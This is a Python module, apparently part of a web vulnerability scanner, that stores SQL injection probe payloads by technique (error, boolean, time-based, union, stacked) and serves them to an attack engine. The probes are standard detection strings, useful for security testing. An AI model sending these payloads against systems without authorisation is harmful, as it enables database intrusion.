"""
===============================================================================
SQL Injection Payload Provider

This module is responsible ONLY for SQL Injection payload generation.

Responsibilities
----------------
✔ Store SQL Injection payloads
✔ Group payloads by attack technique
✔ Provide payloads to the attack engine

Never
-----
✘ Execute HTTP requests
✘ Detect SQL Injection
✘ Validate findings
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


# =============================================================================
# Payload Database
# =============================================================================

ERROR_BASED = (
    "'",
    '"',
    "')",
    '")',
)

BOOLEAN_BASED = (
    "' AND 1=1--",
    "' AND 1=2--",
    '" AND 1=1--',
    '" AND 1=2--',
)

TIME_BASED = (
    "' WAITFOR DELAY '0:0:5'--",
    "';WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    '" AND SLEEP(5)--',
)

UNION_BASED = (
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
)

STACKED_BASED = (
    "';SELECT 1--",
    "';WAITFOR DELAY '0:0:5'--",
)


PAYLOAD_DATABASE = {
    "error": ERROR_BASED,
    "boolean": BOOLEAN_BASED,
    "time": TIME_BASED,
    "union": UNION_BASED,
    "stacked": STACKED_BASED,
}


# =============================================================================
# Payload Provider
# =============================================================================

class SQLiPayloadProvider:
    """
    Generates SQL Injection payloads.

    The attack engine requests payloads from this provider.
    """

    def generate(
        self,
        vector,
    ) -> Iterable[str]:
        """
        Return payloads for the supplied attack vector.

        Future versions can use the vector to select payloads
        based on parameter type, HTTP method, DBMS fingerprint,
        or user configuration.
        """

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )

    def get_category(
        self,
        category: str,
    ) -> Iterable[str]:
        """
        Return payloads from a specific category.
        """

        return PAYLOAD_DATABASE.get(
            category.lower(),
            (),
        )

    def categories(self):
        """
        Return available payload categories.
        """

        return PAYLOAD_DATABASE.keys()